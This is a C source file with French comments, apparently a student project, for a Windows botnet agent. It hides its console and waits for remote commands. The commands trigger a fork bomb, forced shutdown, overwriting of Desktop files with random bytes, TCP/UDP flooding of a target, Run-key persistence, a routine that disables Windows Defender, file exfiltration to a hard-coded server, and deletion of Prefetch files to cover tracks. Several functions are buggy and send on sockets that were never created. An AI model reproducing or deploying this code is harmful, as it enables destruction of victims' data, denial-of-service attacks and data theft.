#define _WIN32_WINNT 0x0501
#include <stdio.h>		//Include des librairies
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ws2tcpip.h>
#include <time.h>
#include <winerror.h>
#include <windows.h>

//#include <fonctions-malware.h>

#pragma comment(lib, "Ws2_32.lib")		//Include des librairies
#define BUFFER_SIZE 1024

#define DEFAULT_BUFLEN 512		// Infos serveurs
#define DEFAULT_PORT "1053"
#define DEFAULT_SERVER "192.168.1.35"
#define DEFAULT_SUPFILE "C:\\Users\\a\\Documents"
#define BUFFER_SIZE 1024

#define PREFETCH_DIRECTORY "C:\\Windows\\Prefetch"

//Déclaratation des fonctions du malware // 


int AutoRun();

int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai );

int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai );

int hardcollec();

int enumfiles();

int dateconvert( FILETIME * valeur);

int envoie_fichier(const char* file_name);

void deletePrefetchFiles();

void supfichier(char* filename);

void ft_exec(char *message);

void receive_message(SOCKET ConnectSocket);

// Fonction qui reçoit une chaîne de caractères via le socket
void recv_string(SOCKET sock, char* buffer) {
  // Initialise le tampon à 0
  memset(buffer, 0, BUFFER_SIZE);

  // Reçoit les données via le socket
  int bytes_received = recv(sock, buffer, BUFFER_SIZE, 0);
  if (bytes_received < 0) {
    perror("Erreur lors de la réception des données");
    return;
  }
}

//---------------------------//
//          * MAIN *         //
//---------------------------//


int main()
{  
  
HWND myWindows = GetConsoleWindow();
ShowWindow(myWindows, SW_HIDE);
    while (1) {

  // Initialisation de Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("Erreur lors de l'initialisation de Winsock\n");
        return 1;
    }

    // Création d'un socket TCP/IP
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Erreur lors de la création du socket\n");
        return 1;
    }

    // Liaison du socket à un port
    SOCKADDR_IN addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1234);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        printf("Erreur lors de la liaison du socket à un port\n");
        return 1;
    }

    // Mise en écoute du socket
    if (listen(sock, 1) == SOCKET_ERROR)
    {
        printf("Erreur lors de la mise en écoute du socket\n");
        return 1;
    }

    // Acceptation de la connexion entrante
    SOCKET client;
    SOCKADDR_IN clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    client = accept(sock, (SOCKADDR*)&clientAddr, &clientAddrSize);
    if (client == INVALID_SOCKET)
    {
        printf("Erreur lors de l'acceptation de la connexion entrante\n");
        return 1;
    }

    // Réception du message
    char buffer[20];
    int bytesReceived = recv(client, buffer, 20, 0);


    // Fermeture de la socket client
    closesocket(client);

    // Fermeture de la socket serveur
    closesocket(sock);

    // Nettoyage de Winsock
    WSACleanup();

    ft_exec(buffer);

    }

}

//---------------------------//
//     * Fonction Julien *   //
//---------------------------//


void ft_exec(char *message) { // Executer les commandes provenant du serveur

    if (strcmp(message, "Forkbomb") == 0) //bombfork
    {
        while (1)
        {
            system("start /B");
        }
    }
    else if (strcmp(message, "Image") == 0) //Lancer des vidéos, sons, images, ...
    {
        system("Botnet.jpg"); //ouverture du fichier    
    }
        else if (strcmp(message, "Song") == 0) //Lancer des vidéos, sons, images, ...
    {
        system("rire.mp3"); //ouverture du fichier       

    }
    else if (strcmp(message, "Shutdown") == 0) //Eteindre la machine
    {
        system("shutdown -s -t 0");
    }
    else if (strcmp(message, "Restart") == 0) //Redémarrage de la machine
    {
        system("shutdown -r -t 0");
    }
    else if (strcmp(message, "Lock") == 0) //Verrouiller la session
    {
        system("rundll32.exe user32.dll,LockWorkStation");
    }
    else if (strcmp(message, "Logoff") == 0) //Déconnecter l'utilisateur
    {
        system("shutdown -l");
    }
    else if (strcmp(message, "Encrypt") == 0) //Alteration des fichiers
    {
        
        WIN32_FIND_DATA FindFileData;
        HANDLE hFind = FindFirstFile("C:\\Users\\a\\Desktop\\*", &FindFileData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    continue;
                }
                else
                {
                    FILE *file;
                    file = fopen(FindFileData.cFileName, "wb");
                    srand(time(NULL));
                    for (int i = 0; i < 100000; i++)
                    {
                        int random = rand() % 255;
                        fputc(random, file);
                    }
                    fclose(file);
                }
            } while (FindNextFile(hFind, &FindFileData) != 0);
            FindClose(hFind);
        }
    }
	    else if (strcmp(message, "DDOS_TCP") == 0) //DDOS une cible en TCP
    {
        ddostcp(5555,"8.8.8.8",50, 500, 10); // BESOIN DE MODIFICATION POUR DEVENIR DYNAMIQUE
    }
		else if (strcmp(message, "DDOS_UDP") == 0) //DDOS une cible en UDP
    {
        ddosudp(5555,"8.8.8.8",50, 500, 10);
    }
		else if (strcmp(message, "Autorun") == 0) //Ré-active l'autorun
    {
        AutoRun();
    }
		else if (strcmp(message, "Hardcollect") == 0) //Collecter info hardware
    {
        hardcollec();
    }
 		else if (strcmp(message, "File_=stealing") == 0) // Envoie de fichier via socket
    {
		envoie_fichier("C:\\Users\\Zombie\\Documents\\testfile.txt");
    }
	 	else if (strcmp(message, "enumfichier") == 0) // Enumeration du repertoire X et de tous c fichier
    {
		enumfiles( NULL, NULL );
    }
        else if (strcmp(message, "Delprefetch") == 0) // Suppression des prefetch
    {
		deletePrefetchFiles();
    }
        else if (strcmp(message, "Delfile") == 0) // Suppression de fichier
    {
		supfichier(DEFAULT_SUPFILE);
    }
}


//---------------------------//
//     * Fonction Alexy *    //
//---------------------------//

int run_reg_file() { //Lance le .reg pour désactiver windows defender même après redémarrage
  int result;
  SHELLEXECUTEINFO sei;

  /* Mise en place de SHELLEXECUTEINFO  */
  ZeroMemory(&sei, sizeof(sei));
  sei.cbSize = sizeof(sei);
  sei.fMask = SEE_MASK_NOCLOSEPROCESS;
  sei.lpFile = "disable_defender.reg";
  sei.lpVerb = "runas";
  sei.nShow = SW_HIDE;

  /* Lancement du .reg file. */
  result = ShellExecuteEx(&sei);
  if (result == 0) {
    /* Erreur lors du lancement. */
    return GetLastError();
  }

  /* Attendre son execution. */
  WaitForSingleObject(sei.hProcess, INFINITE);

  /* Retourne l'exit code */
  result = 0;
  GetExitCodeProcess(sei.hProcess, (LPDWORD) &result);

  /* Fermerture du habdle. */
  CloseHandle(sei.hProcess);

  return result;
}


int AutoRun() // Fonction persistance Windows - Botnet Malware [AutoRun]//
{
	
	char err[128] = "Erreur de création de la persistance\n";
	char suc[128] = "Création de la persistance sur : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	// Permet de retrouver son propre nom, ainsi que son chemin 
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		//send(sock, err, sizeof(err), 0);
		return -1; 
	}

	HKEY NewVal;
	//Ouverture du registre et declaration d'un HKEY
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		//send(sock, err, sizeof(err), 0);
		return -1;
        //Insertion de la nouvelle valeur avec la donnée "BotnetMalware"
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath); // Création du nouvelle clée de registre -> Insérer dans regedit User\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
	if (RegSetValueEx(NewVal, TEXT("BotnetMalware"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		//send(sock, err, sizeof(err), 0);
		return -1;
	}
	//Fermeture du registre
	RegCloseKey(NewVal);
	//send(sock, suc, sizeof(suc), 0);
	return 0;
}


int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai )
{
	FreeConsole(); // Cacher la consoles win
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[sizepacket]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,sizepacket); // Remplis le tableau de byte de 0xCC 0xFFFF foisl


	strcpy( (char*) data, "Paquet Malveillant!"); // Rajoute

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);

	for ( int i=0; i<nbpackets; i++ )
	{
		sock = socket(AF_INET,SOCK_STREAM,0);
		connect(sock, (SOCKADDR *)&sin, sizeof(sin));
		send(sock, data, sizeof(data), 0);
		closesocket(sock);
		Sleep( delai );

	}
	/* - Fermeture du socket - */

    WSACleanup();
    return 0;

}

int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai )
{
	FreeConsole(); // Cacher la consoles win
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[sizepacket]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,sizepacket); // Remplis le tableau de byte de 0xCC 0xFFFF foisl


	strcpy( (char*) data, "Ceci n'est pas issu d'un virus malveillant !"); // Rajoute "Pacquet Malveillant" au debut du packet

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);
	sock = socket(AF_INET,SOCK_DGRAM,0);

	for ( int i=0; i<nbpackets; i++ )
	{
		sendto(sock, data, sizepacket, 0, (SOCKADDR*) &sin, sizeof(sin));
		Sleep( delai );

	}

	closesocket(sock);
	/* - Fermeture du socket - */
    WSACleanup();
    return 0;

}

int hardcollec()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(DEFAULT_SERVER);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	//printf(getenv("set"));
	SYSTEM_INFO siSysInfo;
   // Copie de info hardware dans la strcture SYSTEM_INFO. 
   GetSystemInfo(&siSysInfo); 
   // Affiche le contenue de la strcture system info. 

	char nbproc[128];
	char proctype[128];
	char oemid[128];

	send(sock, nbproc, sizeof(nbproc), 0);
	send(sock, proctype, sizeof(proctype), 0);
   	send(sock, oemid, sizeof(oemid), 0);
    closesocket(sock);
    WSACleanup();
}

int enumfiles( char * dir, char * nameext )
{
	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(DEFAULT_SERVER);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	HANDLE hfind;
	WIN32_FIND_DATA wfd;

	// Initialise la recherche
	
	char directory[MAX_PATH];
	char file[MAX_PATH];

	if ( dir )
		strcpy( directory, dir );
	else
		strcpy( directory, "C:\\Users\\Zombie2\\Pictures\\" );

	if ( nameext )
		strcpy( file, nameext );
	else
		strcpy( file, "*.*" );

	if (  directory[ strlen( directory) - 1 ] != '\\' )
		strcpy( directory, strcat( directory, "\\" ));

	strcpy( file, strcat( directory, file ));

	//printf( "Exploration de " );
	//printf( file );
	//printf( "\n" );


	hfind = FindFirstFile( file, &wfd);

	//Si quelque chose à été trouver
	if (hfind == INVALID_HANDLE_VALUE) return 1;

	FILETIME ftCreate, ftAccess, ftWrite;
	SYSTEMTIME stUTC, stLocal;

	do
	{
		// Si ce n'est pas le répertoire courant DOS ...
		if (wfd.cFileName[0] != '.')
		{
		// Affiche le nom du fichier trouver
			printf(wfd.cFileName);
			send(sock, wfd.cFileName, sizeof(file), 0);
			printf(" - ");

			dateconvert(&wfd.ftCreationTime);
			dateconvert(&wfd.ftLastAccessTime);
			dateconvert(&wfd.ftLastWriteTime);
			printf("\n");

		}
	}
	
	//Recherche le prochain fichier
	while (FindNextFile(hfind, &wfd));

	// Recherche terminer, ferme la recherche
	FindClose(hfind);

    closesocket(sock);
    WSACleanup();
	return 0;
}		

int dateconvert( FILETIME * valeur)
{
	SYSTEMTIME stUTC, stLocal;

	// Convertie la date du denriere accés au fichier en temps local.
    FileTimeToSystemTime( valeur, &stUTC);
    SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);

    // Craft d'une string pour afficher la date.
    printf("[%02d/%02d/%d - %02d:%02d] ",
    stLocal.wDay ,stLocal.wMonth, stLocal.wYear,
    stLocal.wHour, stLocal.wMinute);

}

int envoie_fichier(const char* file_name) 
{

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(DEFAULT_SERVER);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	HANDLE hfind;
	WIN32_FIND_DATA wfd;


  // Ouvre le fichier a envoyer

  FILE* file = fopen(file_name, "rb");
  if (file == NULL) {
    printf("Error opening file\n");
    return -1;
  }

  // Recupère la taille du fichier

  fseek(file, 0, SEEK_END);
  int file_size = ftell(file);
  rewind(file);
  send(sock, (char*)&file_size, sizeof(file_size), 0);

  // Envoie le contenue du fichier au client
  char buffer[BUFFER_SIZE];
  int bytes_read;
  while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
  send(sock, buffer, bytes_read, 0);
  }

  // Ferme le fichier et le socket

  fclose(file);
    closesocket(sock);
    WSACleanup();

  return 0;
}

void supfichier(char* filename) {

  // Supprime ce fichier
  if (remove(filename) != 0) {
  } else {
    printf("Fichier supprimé\n");
  }

}

void deletePrefetchFiles(void) {
  WIN32_FIND_DATA findData;
  HANDLE hFind;
  char path[MAX_PATH];

  // Concatenation entier pour le dir prefetch
  snprintf(path, MAX_PATH, "%s\\*", PREFETCH_DIRECTORY);

  // Trouver le premier fichier prefetch du dossier
  hFind = FindFirstFile(path, &findData);
  if (hFind == INVALID_HANDLE_VALUE) {
    return;
  }

  // Iteration de tout les fichier du dossier preftech
  do {
    // Passe le dossier parent et le dossir actuel
    if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
      continue;
    }

    // Concatenation du path complet
    snprintf(path, MAX_PATH, "%s\\%s", PREFETCH_DIRECTORY, findData.cFileName);

    // Suppression des fichiers
    if (!DeleteFile(path)) {
      //printf("Impossible de supprimer le fichier '%s' (%d)\n", path, GetLastError());
    }
  } while (FindNextFile(hFind, &findData));

  // Ferme le handle du prefetch directory
  FindClose(hFind);

}